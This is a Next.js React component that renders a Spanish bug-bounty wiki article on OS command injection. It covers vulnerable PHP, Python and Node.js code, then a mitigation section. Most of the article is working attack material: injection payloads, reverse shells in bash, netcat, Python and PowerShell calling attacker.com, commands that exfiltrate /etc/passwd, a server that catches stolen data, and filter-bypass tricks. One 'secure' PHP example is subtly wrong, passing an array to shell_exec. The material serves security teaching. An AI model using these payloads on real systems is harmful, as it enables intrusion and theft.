/**
 * COMMAND INJECTION
 * Ejecutar comandos OS arbitrarios
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Terminal, Shield, Zap, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function CommandInjectionContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="Command Injection - El Sistema Operativo es Tuyo">
        <Paragraph>
          <Strong>Command Injection</Strong> ocurre cuando una aplicación ejecuta comandos del sistema 
          con input del usuario sin sanitización. Permite <Strong>Remote Code Execution</Strong>, 
          leer archivos sensibles, y tomar control completo del servidor.
        </Paragraph>

        <AlertDanger title="Impacto Crítico">
          <ul className="mt-2 space-y-1">
            <ListItem>💥 RCE total (ejecutar cualquier comando)</ListItem>
            <ListItem>📁 Leer archivos del sistema (/etc/passwd, keys)</ListItem>
            <ListItem>🔐 Robar credentials y secrets</ListItem>
            <ListItem>🌐 Pivotar a red interna</ListItem>
            <ListItem>⚙️ Instalar backdoors persistentes</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="metacaracteres" title="1. Shell Metacharacters - Armas del Atacante">
        <Paragraph>
          Los shells (bash, sh, cmd) interpretan caracteres especiales que permiten 
          encadenar comandos. Estos son la clave del command injection.
        </Paragraph>

        <CodeBlock
          language="bash"
          title="Metacaracteres peligrosos"
          code={`# Separador de comandos
command1 ; command2          # Ejecuta ambos secuencialmente
command1 && command2         # Ejecuta command2 si command1 exitoso
command1 || command2         # Ejecuta command2 si command1 falla
command1 & command2          # Ejecuta command1 en background

# Pipe y redirección
command1 | command2          # Output de command1 → input de command2
command > file               # Redireccionar output a archivo
command < file               # Leer input de archivo

# Sustitución de comandos
\`command\`                    # Ejecutar command y sustituir output
$(command)                   # Alternativa moderna
$((expression))              # Evaluación aritmética

# Newline
command1
command2                     # Ejecutar en líneas separadas

# Comentario
command # rest ignored      # Todo después de # es ignorado`}
        />
      </Section>

      <Section id="codigo-vulnerable" title="2. Código Vulnerable Común">
        <Subsection title="PHP - system(), exec(), shell_exec()">
          <CodeBlock
            language="php"
            title="❌ VULNERABLE - Ping utility"
            code={`<?php
// Endpoint para hacer ping a hosts
if (isset($_GET['host'])) {
    $host = $_GET['host'];
    
    // ❌ VULNERABLE - Concatenar user input directamente
    $command = "ping -c 4 " . $host;
    
    $output = shell_exec($command);
    
    echo "<pre>$output</pre>";
}
?>

<!-- URL vulnerable:
/ping.php?host=8.8.8.8

URL maliciosa:
/ping.php?host=8.8.8.8;cat /etc/passwd
-->`}
          />
        </Subsection>

        <Subsection title="Python - os.system(), subprocess">
          <CodeBlock
            language="python"
            title="❌ VULNERABLE - Image converter"
            code={`import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/convert')
def convert_image():
    filename = request.args.get('file', 'image.png')
    
    # ❌ VULNERABLE - User input en comando
    command = f"convert {filename} output.jpg"
    
    os.system(command)
    
    return "Conversion complete"

# URL vulnerable:
# /convert?file=image.png

# URL maliciosa:
# /convert?file=image.png; rm -rf /`}
          />
        </Subsection>

        <Subsection title="Node.js - child_process.exec()">
          <CodeBlock
            language="javascript"
            title="❌ VULNERABLE - Git clone utility"
            code={`const express = require('express');
const { exec } = require('child_process');

const app = express();

app.get('/clone', (req, res) => {
  const repo = req.query.repo;
  
  // ❌ VULNERABLE - Template literal con user input
  const command = \`git clone \${repo} /tmp/repo\`;
  
  exec(command, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send(error.message);
    }
    res.send('Clone successful');
  });
});

// URL maliciosa:
// /clone?repo=https://github.com/user/repo;whoami`}
          />
        </Subsection>
      </Section>

      <Section id="payloads-basicos" title="3. Payloads Básicos">
        <CodeBlock
          language="bash"
          title="Técnicas de inyección"
          code={`# 1. Separador de comandos (;)
input; whoami
input; cat /etc/passwd

# 2. AND lógico (&&)
input && id
input && ls -la /root

# 3. OR lógico (||)
input || whoami
invalid_command || cat /etc/shadow

# 4. Pipe (|)
input | whoami
input | nc attacker.com 4444

# 5. Background (&)
input & whoami &
input & curl attacker.com/shell.sh | bash &

# 6. Sustitución de comandos
input\`whoami\`
input$(id)
input\\\`cat /etc/passwd\\\`

# 7. Newline encoded
input%0Awhoami
input%0Aid%0Als

# 8. Comentar resto del comando
input; whoami #
input && id #`}
        />

        <TerminalOutput title="Resultado del payload: input; whoami">
          {`# Comando ejecutado:
ping -c 4 8.8.8.8; whoami

# Output:
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=10.2 ms
...

www-data  ← ¡Comando inyectado ejecutado!`}
        </TerminalOutput>
      </Section>

      <Section id="reverse-shell" title="4. Reverse Shell Completo">
        <CodeBlock
          language="bash"
          title="Payload - Bash reverse shell"
          code={`# En servidor del atacante:
nc -lvnp 4444

# Payload inyectado:
input; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# URL encoded:
input%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261

# Si bash -i está bloqueado, alternativas:
input; nc -e /bin/bash attacker.com 4444
input; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
input; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`}
        />

        <TerminalOutput title="Atacante recibe shell">
          {`nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on victim.com 45678

www-data@victim:~$ whoami
www-data
www-data@victim:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@victim:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...`}
        </TerminalOutput>
      </Section>

      <Section id="exfiltracion-datos" title="5. Exfiltrar Datos">
        <CodeBlock
          language="bash"
          title="Técnicas de exfiltración"
          code={`# 1. Via HTTP GET
input; curl "http://attacker.com/?data=$(cat /etc/passwd | base64)"

# 2. Via DNS (bypass firewall)
input; nslookup $(cat /etc/passwd | head -1 | base64).attacker.com

# 3. Via email (si sendmail disponible)
input; cat /etc/passwd | mail -s "stolen" attacker@evil.com

# 4. Via netcat
input; cat /etc/passwd | nc attacker.com 4444

# 5. Upload a servidor
input; curl -X POST --data-binary @/etc/passwd http://attacker.com/upload`}
        />

        <CodeBlock
          language="python"
          title="Servidor HTTP para capturar datos"
          code={`from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import base64

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if 'data' in params:
            encoded_data = params['data'][0]
            
            try:
                decoded = base64.b64decode(encoded_data).decode('utf-8')
                print(f"\\n[+] EXFILTRATED DATA:\\n{decoded}\\n")
                
                with open('exfiltrated.txt', 'a') as f:
                    f.write(decoded + '\\n')
            except:
                print(f"[!] Raw data: {encoded_data}")
        
        self.send_response(200)
        self.end_headers()

httpd = HTTPServer(('0.0.0.0', 80), ExfilHandler)
print('[*] Listening on port 80 for exfiltrated data...')
httpd.serve_forever()`}
          />
      </Section>

      <Section id="blind-injection" title="6. Blind Command Injection">
        <Paragraph>
          Si no hay output visible, usar <Strong>time-based</Strong> o <Strong>out-of-band</Strong> detection.
        </Paragraph>

        <Subsection title="Time-Based Detection">
          <CodeBlock
            language="bash"
            title="Payloads con delay"
            code={`# Linux - sleep command
input; sleep 10
input & sleep 10 &
input && sleep 10 && 

# Ping como delay (funciona en Windows también)
input & ping -c 10 127.0.0.1 &

# Windows
input & timeout 10 &

# Si la respuesta tarda 10+ segundos → Vulnerable`}
          />
        </Subsection>

        <Subsection title="Out-of-Band Detection">
          <CodeBlock
            language="bash"
            title="DNS/HTTP callbacks"
            code={`# DNS lookup (bypass firewall)
input; nslookup attacker.com
input; dig @8.8.8.8 attacker.com

# HTTP request
input; curl http://attacker.com/ping
input; wget http://attacker.com/ping

# Verificar en logs del atacante si hay request`}
          />
        </Subsection>
      </Section>

      <Section id="bypass-filters" title="7. Bypass de Filtros">
        <Subsection title="Técnica 1: Encoding">
          <CodeBlock
            language="bash"
            title="Bypass con encoding"
            code={`# URL encoding
input%3Bwhoami        → input;whoami
input%0Awhoami        → input\\nwhoami

# Hex encoding (bash)
input; \\x77\\x68\\x6f\\x61\\x6d\\x69  → whoami

# Base64
input; echo d2hvYW1p | base64 -d | bash  → whoami

# Octal
input; \\$(\\printf "\\167\\150\\157\\141\\155\\151")  → whoami`}
          />
        </Subsection>

        <Subsection title="Técnica 2: Wildcards">
          <CodeBlock
            language="bash"
            title="Bypass con wildcards"
            code={`# Si "cat" está bloqueado:
input; c?t /etc/passwd
input; c*t /etc/passwd
input; /bin/ca[t] /etc/passwd
input; /???/c?t /etc/passwd

# Si "/etc/passwd" está bloqueado:
input; cat /e??/p??swd
input; cat /*/passwd`}
          />
        </Subsection>

        <Subsection title="Técnica 3: Variables de Entorno">
          <CodeBlock
            language="bash"
            title="Bypass con variables"
            code={`# Usar $PATH, $HOME, etc.
input; $HOME/.ssh/id_rsa
input; cat $HOME/../root/.ssh/id_rsa

# Crear variables custom
input; CMD=cat;$CMD /etc/passwd
input; A=c;B=at;$A$B /etc/passwd`}
          />
        </Subsection>

        <Subsection title="Técnica 4: String Concatenation">
          <CodeBlock
            language="bash"
            title="Bypass concatenando strings"
            code={`# Si "whoami" está bloqueado:
input; who''ami
input; who"a"mi
input; w\\ho\\am\\i

# Construcción dinámica
input; $(echo who)ami
input; \`printf who\`ami`}
          />
        </Subsection>
      </Section>

      <Section id="windows-injection" title="8. Command Injection en Windows">
        <CodeBlock
          language="batch"
          title="Metacaracteres en Windows CMD"
          code={`REM Separadores
command1 & command2          REM Ejecutar ambos
command1 && command2         REM AND lógico
command1 || command2         REM OR lógico
command1 | command2          REM Pipe

REM Sustitución
\`command\`                    REM No funciona en CMD
FOR /F %i IN ('command') DO  REM Alternativa

REM Ejemplos de payloads
input & whoami
input & type C:\\Windows\\System32\\drivers\\etc\\hosts
input & net user
input & net localgroup administrators
input & ipconfig /all`}
        />

        <CodeBlock
          language="powershell"
          title="PowerShell injection"
          code={`# Si PowerShell disponible
input; powershell -c "whoami"
input; powershell -encodedCommand <base64>

# Download y ejecutar
input; powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# Reverse shell PowerShell
input; powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`}
        />
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Prevenir Command Injection">
          NUNCA ejecutar comandos del sistema con user input sin validación extrema.
        </AlertDanger>

        <Subsection title="1. EVITAR Ejecutar Comandos del Sistema">
          <CodeBlock
            language="python"
            title="✅ MEJOR - Usar librerías nativas"
            code={`# ❌ MAL - Ejecutar ping con subprocess
import subprocess
def ping_host(host):
    subprocess.run(f"ping -c 4 {host}", shell=True)  # VULNERABLE

# ✅ MEJOR - Usar librería de networking
import socket
def check_host(host):
    try:
        socket.gethostbyname(host)
        return True
    except socket.gaierror:
        return False

# ✅ MEJOR - Usar ping3 library
from ping3 import ping
def ping_host(host):
    response_time = ping(host)
    return response_time is not None`}
          />
        </Subsection>

        <Subsection title="2. Usar Subprocess con Lista de Argumentos">
          <CodeBlock
            language="python"
            title="✅ SEGURO - subprocess sin shell=True"
            code={`import subprocess

def convert_image(filename):
    # ✅ SEGURO - Argumentos en lista, shell=False
    try:
        result = subprocess.run(
            ['convert', filename, 'output.jpg'],
            shell=False,  # ← CRÍTICO: No usar shell
            capture_output=True,
            timeout=30,
            check=True
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return None

# Payload inyectado:
# convert_image('image.png; rm -rf /')
# Comando ejecutado: ['convert', 'image.png; rm -rf /', 'output.jpg']
# "image.png; rm -rf /" es tratado como NOMBRE DE ARCHIVO
# No se interpreta como comando separado ✓`}
          />
        </Subsection>

        <Subsection title="3. Whitelist Estricta">
          <CodeBlock
            language="php"
            title="✅ SEGURO - Validar input con whitelist"
            code={`<?php
function ping_host($host) {
    // ✅ Whitelist de caracteres permitidos
    if (!preg_match('/^[a-zA-Z0-9.-]+$/', $host)) {
        throw new Exception('Invalid hostname format');
    }
    
    // ✅ Validar longitud
    if (strlen($host) > 253) {
        throw new Exception('Hostname too long');
    }
    
    // ✅ Usar escapeshellarg()
    $safe_host = escapeshellarg($host);
    
    // ✅ Usar array de argumentos (PHP 7.4+)
    $output = shell_exec(['ping', '-c', '4', $host]);
    
    return $output;
}
?>`}
          />
        </Subsection>

        <Subsection title="4. Node.js - execFile en lugar de exec">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - execFile no usa shell"
            code={`const { execFile } = require('child_process');

function cloneRepo(repo) {
  // ✅ Validar URL
  const urlPattern = /^https:\\/\\/github\\.com\\/[a-zA-Z0-9_-]+\\/[a-zA-Z0-9_.-]+$/;
  
  if (!urlPattern.test(repo)) {
    throw new Error('Invalid repository URL');
  }
  
  // ✅ SEGURO - execFile con array de args
  execFile('git', ['clone', repo, '/tmp/repo'], (error, stdout, stderr) => {
    if (error) {
      console.error('Clone failed:', error);
      return;
    }
    console.log('Clone successful');
  });
}

// Payload inyectado: "https://github.com/user/repo;whoami"
// No pasa validación de regex → Rechazado ✓`}
          />
        </Subsection>

        <Subsection title="5. Sanitización con Funciones Específicas">
          <CodeBlock
            language="php"
            title="✅ Escapar metacaracteres"
            code={`<?php
// ✅ escapeshellarg() - Escapa un argumento
$safe_arg = escapeshellarg($user_input);
$command = "grep $safe_arg /var/log/app.log";

// ✅ escapeshellcmd() - Escapa comando completo
$safe_cmd = escapeshellcmd($user_command);

// Pero CUIDADO: No combinar ambas
// ❌ VULNERABLE
$arg = escapeshellarg($input);
$cmd = escapeshellcmd("grep $arg file");
// Puede crear bypass

// ✅ MEJOR: Usar solo escapeshellarg en argumentos
?>`}
          />
        </Subsection>

        <Subsection title="6. Principio de Mínimo Privilegio">
          <CodeBlock
            language="bash"
            title="✅ Ejecutar con usuario limitado"
            code={`# Crear usuario sin privilegios
useradd -r -s /bin/false appuser

# Configurar sudoers para comandos específicos
# /etc/sudoers.d/app
appuser ALL=(root) NOPASSWD: /usr/bin/convert

# Ejecutar app como appuser
su -s /bin/bash -c "node app.js" appuser

# Si hay command injection, atacante solo tiene permisos de appuser
# No puede: rm -rf /, modificar /etc, instalar software`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Path Traversal</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/path-traversal`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Acceder a archivos fuera del directorio permitido</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
